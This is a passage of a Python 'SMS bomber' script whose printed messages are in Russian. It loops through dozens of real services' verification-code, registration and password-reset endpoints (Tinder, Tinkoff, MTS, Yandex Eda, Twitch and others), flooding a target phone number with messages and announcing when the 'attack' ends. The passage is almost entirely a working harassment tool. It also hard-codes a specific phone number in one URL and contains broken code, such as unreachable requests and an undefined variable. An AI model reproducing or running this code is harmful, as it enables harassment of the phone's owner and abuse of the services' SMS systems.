            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Was sent!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post(
                'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                        'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                data={'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            R = R + 1
            print('[+] carsmile Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                          json={'phone': '+' + self.formatted_phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            time.sleep(1)
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php',
                          data={'aj': '50', 'registration-phone': _phone})
            R = R + 1
            print('[+] StarPizzaCafe Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            R = R + 1
            print('[+] Dostavista Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:

            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] MonoBank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
            R = R + 1
            print('[+] binotel Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                         data={"phone": _phone})
            R = R + 1
            print('[+] SportMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
